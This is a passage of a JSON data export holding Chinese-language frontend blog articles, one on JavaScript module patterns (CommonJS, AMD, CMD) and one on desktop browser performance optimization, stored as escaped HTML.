statement\n}1234567\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样在需要的以后夹在函数所在文件，调用函数就可以了\u003c/p\u003e\u003cp\u003e这种做法的缺点很明显：污染了全局变量，无法保证不与其他模块发生变量名冲突，而且模块成员之间没什么关系。\u003c/p\u003e\u003cp\u003e\u003cb\u003e对象\u003c/b\u003e\u003c/p\u003e\u003cp\u003e为了解决上面问题，对象的写法应运而生，可以把所有的模块成员封装在一个对象中\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar myModule = {\n    var1: 1,\n\n    var2: 2,\n\n    fn1: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n\n    },\n\n    fn2: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n\n    }\n}12345678910111213\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样我们在希望调用模块的时候引用对应文件，然后\u003c/p\u003e\u003cp\u003emyModule.fn2(); \u003cbr\u003e这样避免了变量污染，只要保证模块名唯一即可，同时同一模块内的成员也有了关系\u003c/p\u003e\u003cp\u003e看似不错的解决方案，但是也有缺陷，外部可以随意修改内部成员\u003c/p\u003e\u003cp\u003emyModel.var1 = 100; \u003cbr\u003e这样就会产生意外的安全问题\u003c/p\u003e\u003cp\u003e\u003cb\u003e立即执行函数\u003c/b\u003e\u003c/p\u003e\u003cp\u003e可以通过立即执行函数，来达到隐藏细节的目的\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar myModule = (\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n    var var1 = 1;\n    var var2 = 2;\n\n    \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efn1\u003c/span\u003e\u003c/span\u003e(){\n\n    }\n\n    \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efn2\u003c/span\u003e\u003c/span\u003e(){\n\n    }\n\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e {\n        fn1: fn1,\n        fn2: fn2\n    };\n})();1234567891011121314151617\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样在模块外部无法修改我们没有暴露出来的变量、函数\u003c/p\u003e\u003cp\u003e上述做法就是我们模块化的基础，目前，通行的JavaScript模块规范主要有两种：CommonJS和AMD\u003c/p\u003e\u003cp\u003e\u003cb\u003eCommonJS\u003c/b\u003e\u003c/p\u003e\u003cp\u003e我们先从CommonJS谈起，因为在网页端没有模块化编程只是页面JavaScript逻辑复杂，但也可以工作下去，在服务器端却一定要有模块，所以虽然JavaScript在web端发展这么多年，第一个流行的模块化规范却由服务器端的JavaScript应用带来，CommonJS规范是由NodeJS发扬光大，这标志着JavaScript模块化编程正式登上舞台。\u003c/p\u003e\u003cp\u003e1、定义模块 \u003cbr\u003e根据CommonJS规范，一个单独的文件就是一个模块。每一个模块都是一个单独的作用域，也就是说，在该模块内部定义的变量，无法被其他模块读取，除非定义为global对象的属性\u003c/p\u003e\u003cp\u003e2、模块输出： \u003cbr\u003e模块只有一个出口，module.exports对象，我们需要把模块希望输出的内容放入该对象\u003c/p\u003e\u003cp\u003e3、加载模块： \u003cbr\u003e加载模块使用require方法，该方法读取一个文件并执行，返回文件内部的module.exports对象\u003c/p\u003e\u003cp\u003e看个例子\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e//模块定义 myModel.js\n\nvar name = \u003cspan class=\"hljs-string\"\u003e'Byron'\u003c/span\u003e;\n\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eprintName\u003c/span\u003e\u003c/span\u003e(){\n    console.log(name);\n}\n\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003eFullName(firstName){\n    console.log(firstName + name);\n}\n\nmodule.exports = {\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003eName: \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003eName,\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003eFullName: \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003eFullName\n}\n\n//加载模块\n\nvar nameModule = require(\u003cspan class=\"hljs-string\"\u003e'./myModel.js'\u003c/span\u003e);\n\nnameModule.printName();12345678910111213141516171819202122\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e不同的实现对require时的路径有不同要求，一般情况可以省略js拓展名，可以使用相对路径，也可以使用绝对路径，甚至可以省略路径直接使用模块名（前提是该模块是系统内置模块）\u003c/p\u003e\u003cp\u003e\u003cb\u003e尴尬的浏览器\u003c/b\u003e\u003c/p\u003e\u003cp\u003e仔细看上面的代码，会发现require是同步的。模块系统需要同步读取模块文件内容，并编译执行以得到模块接口。\u003c/p\u003e\u003cp\u003e这在服务器端实现很简单，也很自然，然而， 想在浏览器端实现问题却很多。\u003c/p\u003e\u003cp\u003e浏览器端，加载JavaScript最佳、最容易的方式是在document中插入script 标签。但脚本标签天生异步，传统CommonJS模块在浏览器环境中无法正常加载。\u003c/p\u003e\u003cp\u003e解决思路之一是，开发一个服务器端组件，对模块代码作静态分析，将模块与它的依赖列表一起返回给浏览器端。 这很好使，但需要服务器安装额外的组件，并因此要调整一系列底层架构。\u003c/p\u003e\u003cp\u003e另一种解决思路是，用一套标准模板来封装模块定义，但是对于模块应该怎么定义和怎么加载，又产生的分歧：\u003c/p\u003e\u003ch2\u003eAMD\u003c/h2\u003e\u003cp\u003eAMD 即Asynchronous Module Definition，中文名是异步模块定义的意思。它是一个在浏览器端模块化开发的规范\u003c/p\u003e\u003cp\u003e由于不是JavaScript原生支持，使用AMD规范进行页面开发需要用到对应的库函数，也就是大名鼎鼎RequireJS，实际上AMD 是 RequireJS 在推广过程中对模块定义的规范化的产出\u003c/p\u003e\u003cp\u003erequireJS主要解决两个问题\u003c/p\u003e\u003cp\u003e1、多个js文件可能有依赖关系，被依赖的文件需要早于依赖它的文件加载到浏览器 \u003cbr\u003e2、js加载的时候浏览器会停止页面渲染，加载文件越多，页面失去响应时间越长 \u003cbr\u003e看一个使用requireJS的例子\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e// 定义模块 myModule.js\ndefine([\u003cspan class=\"hljs-string\"\u003e'dependency'\u003c/span\u003e], \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n    var name = \u003cspan class=\"hljs-string\"\u003e'Byron'\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eprintName\u003c/span\u003e\u003c/span\u003e(){\n        console.log(name);\n    }\n\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e {\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003eName: \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003eName\n    };\n});\n\n// 加载模块\nrequire([\u003cspan class=\"hljs-string\"\u003e'myModule'\u003c/span\u003e], \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (my){\n　 my.printName();\n});12345678910111213141516\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cb\u003e语法\u003c/b\u003e\u003c/p\u003e\u003cp\u003erequireJS定义了一个函数 define，它是全局变量，用来定义模块\u003c/p\u003e\u003cp\u003edefine(id?, dependencies?, factory);\u003c/p\u003e\u003col\u003e\u003cli\u003eid：可选参数，用来定义模块的标识，如果没有提供该参数，脚本文件名（去掉拓展名）\u003c/li\u003e\u003cli\u003edependencies：是一个当前模块依赖的模块名称数组\u003c/li\u003e\u003cli\u003efactory：工厂方法，模块初始化要执行的函数或对象。如果为函数，它应该只被执行一次。如果是对象，此对象应该为模块的输出值 \u003cbr\u003e在页面上使用require函数加载模块\u003c/li\u003e\u003c/ol\u003e\u003cp\u003erequire([dependencies], function(){}); \u003cbr\u003erequire()函数接受两个参数\u003c/p\u003e\u003col\u003e\u003cli\u003e第一个参数是一个数组，表示所依赖的模块\u003c/li\u003e\u003cli\u003e第二个参数是一个回调函数，当前面指定的模块都加载成功后，它将被调用。加载的模块会以参数形式传入该函数，从而在回调函数内部就可以使用这些模块\u003c/li\u003e\u003c/ol\u003e\u003cp\u003erequire()函数在加载依赖的函数的时候是异步加载的，这样浏览器不会失去响应，它指定的回调函数，只有前面的模块都加载成功后，才会运行，解决了依赖性的问题。\u003c/p\u003e\u003ch2\u003eCMD\u003c/h2\u003e\u003cp\u003eCMD 即Common Module Definition通用模块定义，CMD规范是国内发展出来的，就像AMD有个requireJS，CMD有个浏览器的实现SeaJS，SeaJS要解决的问题和requireJS一样，只不过在模块定义方式和模块加载（可以说运行、解析）时机上有所不同 \u003cbr\u003e\u003cb\u003e语法\u003c/b\u003e \u003cbr\u003eSea.js 推崇一个模块一个文件，遵循统一的写法 \u003cbr\u003edefine(id?, deps?, factory) \u003cbr\u003e因为CMD推崇\u003c/p\u003e\u003col\u003e\u003cli\u003e一个文件一个模块，所以经常就用文件名作为模块id\u003c/li\u003e\u003cli\u003eCMD推崇依赖就近，所以一般不在define的参数中写依赖，在factory中写\u003c/li\u003e\u003c/ol\u003e\u003cp\u003efactory是一个函数，有三个参数，function(require, exports, module)\u003c/p\u003e\u003col\u003e\u003cli\u003erequire 是一个方法，接受 模块标识 作为唯一参数，用来获取其他模块提供的接口：require(id)\u003c/li\u003e\u003cli\u003eexports 是一个对象，用来向外提供模块接口\u003c/li\u003e\u003cli\u003emodule 是一个对象，上面存储了与当前模块相关联的一些属性和方法\u003c/li\u003e\u003c/ol\u003e\u003cp\u003e看个例子：\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e// 定义模块  myModule.js\ndefine(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(require, exports, module) {\n  var $ = require(\u003cspan class=\"hljs-string\"\u003e'jquery.js'\u003c/span\u003e)\n  $(\u003cspan class=\"hljs-string\"\u003e'div'\u003c/span\u003e).addClass(\u003cspan class=\"hljs-string\"\u003e'active'\u003c/span\u003e);\n});\n\n// 加载模块\nseajs.use([\u003cspan class=\"hljs-string\"\u003e'myModule.js'\u003c/span\u003e], \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(my){\n\n});12345678910\u003c/code\u003e\u003c/pre\u003e\u003ch2\u003eAMD与CMD区别\u003c/h2\u003e\u003cp\u003e关于这两个的区别网上可以搜出一堆文章，简单总结一下\u003c/p\u003e\u003cp\u003e最明显的区别就是在模块定义时对依赖的处理不同\u003c/p\u003e\u003cp\u003e\u003cb\u003e1、AMD推崇依赖前置，在定义模块的时候就要声明其依赖的模块\u003c/b\u003e \u003cbr\u003e\u003cb\u003e2、CMD推崇就近依赖，只有在用到某个模块的时候再去require\u003c/b\u003e \u003cbr\u003e这种区别各有优劣，只是语法上的差距，而且requireJS和SeaJS都支持对方的写法\u003c/p\u003e\u003cp\u003eAMD和CMD最大的区别是对依赖模块的执行时机处理不同，注意不是加载的时机或者方式不同\u003c/p\u003e\u003cp\u003e很多人说requireJS是异步加载模块，SeaJS是同步加载模块，这么理解实际上是不准确的，其实加载模块都是异步的，只不过AMD依赖前置，js可以方便知道依赖模块是谁，立即加载，而CMD就近依赖，需要使用把模块变为字符串解析一遍才知道依赖了那些模块，这也是很多人诟病CMD的一点，牺牲性能来带来开发的便利性，实际上解析模块用的时间短到可以忽略\u003c/p\u003e\u003cp\u003e为什么我们说两个的区别是依赖模块执行时机不同，为什么很多人认为ADM是异步的，CMD是同步的（除了名字的原因。。。）\u003c/p\u003e\u003cp\u003e同样都是异步加载模块，AMD在加载模块完成后就会执行改模块，所有模块都加载执行完后会进入require的回调函数，执行主逻辑，这样的效果就是依赖模块的执行顺序和书写顺序不一定一致，看网络速度，哪个先下载下来，哪个先执行，但是主逻辑一定在所有依赖加载完成后才执行\u003c/p\u003e\u003cp\u003eCMD加载完某个依赖模块后并不执行，只是下载而已，在所有依赖模块加载完成后进入主逻辑，遇到require语句的时候才执行对应的模块，这样模块的执行顺序和书写顺序是完全一致的\u003c/p\u003e\u003cp\u003e这也是很多人说AMD用户体验好，因为没有延迟，依赖模块提前执行了，CMD性能好，因为只有用户需要的时候才执行的原因\u003c/p\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e","buildTime":"1514971902.0397","__v":0}
{"_id":{"$oid":"5a4cc38885472a29ac40336b"},"id":"5a43343bf265da432f316441","author":{"$oid":"5a4b76d92239bd131cd79f2f"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"前端性能优化之桌面浏览器优化策略","meta":{"likeCount":0},"tag":["CSS","JavaScript","浏览器","前端"],"comment":[],"shortContent":"在前端页面中，通常建议尽可能合并资源图片、Javascript 或 CSS 代码，减少页面请求数和资源请求消耗，这样可以缩短页面首次访问的用户等待时间。通过构建工具合并雪碧图、CSS、JavaScript 文件等都是为了减少 HTTP 请求次数。另外也要尽量避免重复的资源，防止…","content":"\u003cblockquote\u003e\n\u003cp\u003e通过上篇文章\u003ca target=\"_blank\" href=\"https://juejin.im/post/5a41abb35188252a3d383eb8\"\u003e前端性能测试\u003c/a\u003e的性能测试和分析，我们基本可以获取收集到页面上的具体性能数据，如何根据这些数据采取适当的方法和手段对当前的页面进行优化呢？目前来看，前端优化的策略很多，如\u003ca target=\"_blank\" href=\"http://yslow.org/\"\u003eYSlow\u003c/a\u003e(\u003cstrong\u003eYslow\u003c/strong\u003e 是 \u003cstrong\u003eYahoo\u003c/strong\u003e 发布的一款 \u003cstrong\u003eFirefox\u003c/strong\u003e 插件，可以对网站的页面性能进行分析，提出对该页面性能优化的建议)原则等，总结起来主要包括网络加载类、页面渲染类、\u003cstrong\u003eCSS\u003c/strong\u003e 优化类、\u003cstrong\u003eJavaScript\u003c/strong\u003e 执行类、缓存类、图片类、架构协议类等几类，本文主要介绍桌面端浏览器的性能优化策略，分为两部分，网络加载类和页面渲染类。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e网络加载类\u003c/h2\u003e\n\u003ch4 class=\"heading\"\u003e1.减少 HTTP 资源请求次数\u003c/h4\u003e\n\u003cp\u003e在前端页面中，通常建议尽可能合并资源图片、\u003cstrong\u003eJavascript\u003c/strong\u003e 或 \u003cstrong\u003eCSS\u003c/strong\u003e 代码，减少页面请求数和资源请求消耗，这样可以缩短页面首次访问的用户等待时间。通过构建工具合并雪碧图、\u003cstrong\u003eCSS\u003c/strong\u003e、\u003cstrong\u003eJavaScript\u003c/strong\u003e 文件等都是为了减少 \u003cstrong\u003eHTTP\u003c/strong\u003e 请求次数。另外也要尽量避免重复的资源，防止增加多余请求。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e2.减小 \u003cstrong\u003eHTTP\u003c/strong\u003e 请求大小\u003c/h4\u003e\n\u003cp\u003e除了减少 \u003cstrong\u003eHTTP\u003c/strong\u003e 资源请求次数，也要尽量减小每个 \u003cstrong\u003eHTTP\u003c/strong\u003e 请求的大小。如减少没必要的图片、\u003cstrong\u003eJavaScript\u003c/strong\u003e、\u003cstrong\u003eCSS\u003c/strong\u003e 及\u003cstrong\u003eHTML\u003c/strong\u003e 代码，对文件进行压缩优化，或者使用 \u003cstrong\u003egzip\u003c/strong\u003e 压缩传输内容等都可以用来减小文件大小，缩短网络传输等待延时。前面我们使用构建工具来压缩静态图片资源以及移除代码中的注释并压缩，目的都是为了减小 \u003cstrong\u003eHTTP\u003c/strong\u003e 请求的大小。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e3.将\u003cstrong\u003eCSS\u003c/strong\u003e 或 \u003cstrong\u003eJavaScript\u003c/strong\u003e 放到外部文件中，避免使用 \u0026lt;style\u0026gt; 和 \u0026lt;script\u0026gt; 标签直接引入\u003c/h4\u003e\n\u003cp\u003e在 \u003cstrong\u003eHTML\u003c/strong\u003e 文件中引用外部资源可以有效利用浏览器的静态资源缓存，但有时候在移动端页面 \u003cstrong\u003eCSS\u003c/strong\u003e 或 \u003cstrong\u003eJavaScript\u003c/strong\u003e 比较简单的情况下为了减少请求，也会将 \u003cstrong\u003eCSS\u003c/strong\u003e 或 \u003cstrong\u003eJavaScript\u003c/strong\u003e 直接写到 \u003cstrong\u003eHTML\u003c/strong\u003e 里面，具体要根据 \u003cstrong\u003eCSS\u003c/strong\u003e 或 \u003cstrong\u003eJavaScript\u003c/strong\u003e 文件的大小和业务的场景来分析。如果 \u003cstrong\u003eCSS\u003c/strong\u003e 或 \u003cstrong\u003eJavaScript\u003c/strong\u003e 文件内容较多，业务逻辑较复杂，建议放到外部文件引入。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;link rel=\u003cspan class=\"hljs-string\"\u003e\"stylesheet\"\u003c/span\u003e href=\u003cspan class=\"hljs-string\"\u003e\"//cdn.domain.com/path/main.css\"\u003c/span\u003e\u0026gt;\n...\n\u0026lt;script src=\u003cspan class=\"hljs-string\"\u003e\"//cdn.domain.com/path/main.js\"\u003c/span\u003e\u0026gt;\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e4.避免页面中空的 href 和 src\u003c/h4\u003e\n\u003cp\u003e当 \u0026lt;link\u0026gt;标签的 \u003ccode\u003ehref\u003c/code\u003e 属性为空，或\u0026lt;script\u0026gt;、\u0026lt;img\u0026gt;、\u0026lt;iframe\u0026gt;标签的 \u003ccode\u003esrc\u003c/code\u003e 属性为空时，浏览器在渲染的过程中仍会将 \u003ccode\u003ehref\u003c/code\u003e 属性或 \u003ccode\u003esrc\u003c/code\u003e 属性中的空内容进行加载，直到加载失败，这样就阻塞了页面中其他资源的下载进程，而且最终加载到的内容是无效的，因此要尽量避免。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;!-- 不推荐 --\u0026gt;\n\u0026lt;img src=\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e alt=\u003cspan class=\"hljs-string\"\u003e\"photo\"\u003c/span\u003e\u0026gt;\n\u0026lt;a href=\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u0026gt;\u0026lt;/a\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e5.为 \u003cstrong\u003eHTML\u003c/strong\u003e 指定 Cache-Control 或 Expires\u003c/h4\u003e\n\u003cp\u003e为 \u003cstrong\u003eHTML\u003c/strong\u003e内容设置 \u003ccode\u003eCache-Control\u003c/code\u003e 或 \u003ccode\u003eExpires\u003c/code\u003e 可以将 \u003cstrong\u003eHTML\u003c/strong\u003e内容缓存起来，避免频繁向服务器端发送请求。在页面\u003ccode\u003eCache-Control\u003c/code\u003e 或 \u003ccode\u003eExpires\u003c/code\u003e 头部有效时，浏览器将从缓存中读取内容，不向服务器发送请求。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;meta http-equiv=\u003cspan class=\"hljs-string\"\u003e\"Cache-Control\"\u003c/span\u003e content=\u003cspan class=\"hljs-string\"\u003e\"max-age=7200\"\u003c/span\u003e /\u0026gt;\n\u0026lt;meta http-equiv=\u003cspan class=\"hljs-string\"\u003e\"Expires\"\u003c/span\u003e content=\u003cspan class=\"hljs-string\"\u003e\"Mon, 20 Jul 2017 23:00:00 GMT\"\u003c/span\u003e /\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e6.合理设置 \u003cstrong\u003eEtag\u003c/strong\u003e 和 \u003cstrong\u003eLast-Modified\u003c/strong\u003e\u003c/h4\u003e\n\u003cp\u003e合理设置 \u003cstrong\u003eEtag\u003c/strong\u003e  和 \u003cstrong\u003eLast-Modified\u003c/strong\u003e 使用浏览器缓存，对于未修改的文件，静态资源服务器会向浏览器端返回 \u003cstrong\u003e304\u003c/strong\u003e ，让浏览器从缓存中读取文件，减少 \u003cstrong\u003eWeb\u003c/strong\u003e 资源下载的带宽消耗并降低服务器负载。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;meta http-equiv=\u003cspan class=\"hljs-string\"\u003e\"Last-Modified\"\u003c/span\u003e content=\u003cspan class=\"hljs-string\"\u003e\"Mon, 03 Oct 2017 17:45:57 GMT\"\u003c/span\u003e /\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e7.减少页面重定向\u003c/h4\u003e\n\u003cp\u003e页面每次重定向都会延长页面内容返回的等待延时，一次重定向大约需要 \u003cstrong\u003e600\u003c/strong\u003e 毫秒的时间开销，为了保证用户尽快看到页面的内容，要尽量避免页面重定向。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e8.使用静态资源分域存放来增加下载并行数\u003c/h4\u003e\n\u003cp\u003e浏览器在同一时刻向同一个域名请求文件的并行下载数是有限的，因此可以利用多个域名的主机来存放不同的静态资源，增大页面加载时资源的并行下载数，缩短页面资源加载的时间。通常根据多个域名来分别存储 \u003cstrong\u003eJavaScript\u003c/strong\u003e、\u003cstrong\u003eCSS\u003c/strong\u003e 和图片文件。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;link rel=\u003cspan class=\"hljs-string\"\u003e\"stylesheet\"\u003c/span\u003e href=\u003cspan class=\"hljs-string\"\u003e\"//cdn1.domain.com/path/main.css\"\u003c/span\u003e\u0026gt;\n...\n\u0026lt;script src=\u003cspan class=\"hljs-string\"\u003e\"//cdn2.domain.com/path/main.js\"\u003c/span\u003e\u0026gt;\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e9.使用静态资源 \u003cstrong\u003eCDN\u003c/strong\u003e 来存储文件\u003c/h4\u003e\n\u003cp\u003e如果条件允许，可以利用 \u003cstrong\u003eCDN\u003c/strong\u003e 网络加快同一个地理区域内重复静态资源文件的响应下载速度，缩短资源请求时间。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e10.使用 \u003cstrong\u003eCDN Combo\u003c/strong\u003e 下载传输内容\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003eCDN Combo\u003c/strong\u003e 是在 \u003cstrong\u003eCDN\u003c/strong\u003e 服务器端将多个文件请求打包成一个文件的形式来返回的技术，这样可以实现 \u003cstrong\u003eHTTP\u003c/strong\u003e 连接传输的一次复用，减少浏览器的 \u003cstrong\u003eHTTP\u003c/strong\u003e 请求数，加快资源下载速度。例如同一个域名 \u003cstrong\u003eCDN\u003c/strong\u003e 服务器上的 \u003ccode\u003ea.js\u003c/code\u003e，\u003ccode\u003eb.js\u003c/code\u003e，\u003ccode\u003ec.js\u003c/code\u003e 就可以按如下方式在一个请求中下载。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;script src=\u003cspan class=\"hljs-string\"\u003e\"//cdn.domain.com/path/a.js,b.js,c.js\"\u003c/span\u003e\u0026gt;\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e11.使用可缓存的 AJAX\u003c/h4\u003e\n\u003cp\u003e对于返回内容相同的请求，没必要每次都直接从服务端拉取，合理使用 \u003cstrong\u003eAJAX\u003c/strong\u003e 缓存能加快 \u003cstrong\u003eAJAX\u003c/strong\u003e 响应速度并减轻服务器压力。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e$.ajax({\n    url:url,\n    \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'get'\u003c/span\u003e,\n    cache: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,        //推荐使用缓存\n    data: {}\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003esuccess\u003c/span\u003e\u003c/span\u003e(){\n        //...\n    },\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eerror\u003c/span\u003e\u003c/span\u003e(){\n        //...\n    }\n});\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e12.使用 \u003cstrong\u003eGET\u003c/strong\u003e 来完成 \u003cstrong\u003eAJAX\u003c/strong\u003e 请求\u003c/h4\u003e\n\u003cp\u003e使用 \u003cstrong\u003eXMLHttpRequest\u003c/strong\u003e 时，浏览器中的 \u003cstrong\u003ePOST\u003c/strong\u003e 方法发送请求首先发送文件头，然后发送 \u003cstrong\u003eHTTP\u003c/strong\u003e 正文数据。而使用 \u003cstrong\u003eGET\u003c/strong\u003e 时只发送头部，所以在拉取服务端数据时使用 \u003cstrong\u003eGET\u003c/strong\u003e 请求效率更高。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e$.ajax({\n    url:url,\n    \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'get'\u003c/span\u003e,       //推荐使用 get 完成请求\n    data: {}\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003esuccess\u003c/span\u003e\u003c/span\u003e(){\n        //...\n    },\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eerror\u003c/span\u003e\u003c/span\u003e(){\n        //...\n    }\n});\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e13.减少 \u003cstrong\u003eCookie\u003c/strong\u003e 的大小并进行 \u003cstrong\u003eCookie\u003c/strong\u003e 隔离\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003eHTTP\u003c/strong\u003e 请求通常默认带上浏览器端的 \u003cstrong\u003eCookie\u003c/strong\u003e 一起发送给服务器，所以在非必要的情况下，要尽量减少 \u003cstrong\u003eCookie\u003c/strong\u003e 来减小 \u003cstrong\u003eHTTP\u003c/strong\u003e 请求的大小。对于静态资源，尽量使用不同的域名来存放，因为 \u003cstrong\u003eCookie\u003c/strong\u003e 默认是不能跨域的，这样就做到了不同域名下静态资源请求的 Cookie 隔离。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e14. 缩小 \u003cstrong\u003efavicon.ico\u003c/strong\u003e 并缓存\u003c/h4\u003e\n\u003cp\u003e有利于 \u003cstrong\u003efavicon.ico\u003c/strong\u003e 的重复加载，因为一般一个 Web 应用的 \u003cstrong\u003efavicon.ico\u003c/strong\u003e 是很少改变的。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e15.推荐使用异步 \u003cstrong\u003eJavaScript\u003c/strong\u003e 资源\u003c/h4\u003e\n\u003cp\u003e异步的 \u003cstrong\u003eJavaScript\u003c/strong\u003e 资源不会阻塞文档解析，所以允许在浏览器中优先渲染页面，延后加载脚本执行。例如 \u003cstrong\u003eJavaScript\u003c/strong\u003e 的引用可以如下设置，也可以使用模块化加载机制来实现。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;script src=\u003cspan class=\"hljs-string\"\u003e\"//main.js\"\u003c/span\u003e defer\u0026gt;\u0026lt;/script\u0026gt; //使用defer时，加载后续文档元素的过程和main.js的加载是并行的，但main.js的执行要在页面所有元素解析完成之后才开始执行\n\u0026lt;script src=\u003cspan class=\"hljs-string\"\u003e\"//main.js\"\u003c/span\u003e async\u0026gt;\u0026lt;/script\u0026gt; //使用async时，加载后续文档元素的过程和main.js的加载是并行的\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e16.消除阻塞渲染的 \u003cstrong\u003eCSS\u003c/strong\u003e 及 \u003cstrong\u003eJavaScript\u003c/strong\u003e\u003c/h4\u003e\n\u003cp\u003e对于页面中加载时间过长的 \u003cstrong\u003eCSS\u003c/strong\u003e 或 \u003cstrong\u003eJavaScript\u003c/strong\u003e 文件，需要进行合理拆分或延后加载，保证关键路径的资源能快速加载完成。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e17.避免使用 CSS import 引用加载 CSS\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003eCSS\u003c/strong\u003e 中的 \u003cstrong\u003e@import\u003c/strong\u003e 可以从另一个文件中引入样式，但应该避免这种用法，因为这样会增加 \u003cstrong\u003eCSS\u003c/strong\u003e 资源加载的关键路径长度，带有 \u003cstrong\u003e@import\u003c/strong\u003e 的 \u003cstrong\u003eCSS\u003c/strong\u003e 样式需要在 \u003cstrong\u003eCSS\u003c/strong\u003e 文件串行解析到 \u003cstrong\u003e@import\u003c/strong\u003e 时才会加载另外的 \u003cstrong\u003eCSS\u003c/strong\u003e 文件，大大延后 \u003cstrong\u003eCSS\u003c/strong\u003e 渲染完成的时间。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;!--不推荐--\u0026gt;\n\u0026lt;style\u0026gt;\n@import \u003cspan 